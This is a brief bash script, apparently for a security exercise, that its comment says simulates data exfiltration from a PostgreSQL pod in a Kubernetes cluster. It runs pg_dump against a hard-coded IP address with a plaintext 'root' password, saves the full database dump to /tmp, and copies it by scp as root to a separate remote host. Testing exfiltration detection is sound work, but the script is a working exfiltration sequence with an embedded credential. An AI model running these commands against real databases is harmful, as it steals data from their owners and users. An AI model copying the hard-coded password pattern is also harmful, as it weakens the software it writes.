#!/bin/bash
# Script to simulate data exfiltration from a PostgreSQL pod
PGPASSWORD='root' pg_dump -h 34.118.235.30 -U postgres -d postgres > /tmp/exfiltrated_data.sql
# Upload the file to a remote server (e.g., using scp or curl)
scp /tmp/exfiltrated_data.sql root@chas-vm-connect-gke:/root/kalyani/exfiltrated_data.sql
